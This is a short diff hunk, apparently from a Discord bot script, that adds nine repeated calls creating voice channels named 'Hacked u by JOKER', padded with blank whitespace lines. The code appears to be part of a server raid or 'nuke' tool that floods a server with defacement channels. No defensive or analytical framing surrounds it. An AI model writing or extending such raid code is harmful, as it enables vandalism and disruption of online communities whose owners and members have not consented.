@@ -429,6 +429,22 @@ m.createChannel('Hacked u by JOKER', 'voice');
                 
                    
                    
+        
+ m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+                
+                   
+                   
+                   
+                   
+                   
                    
                    
                    
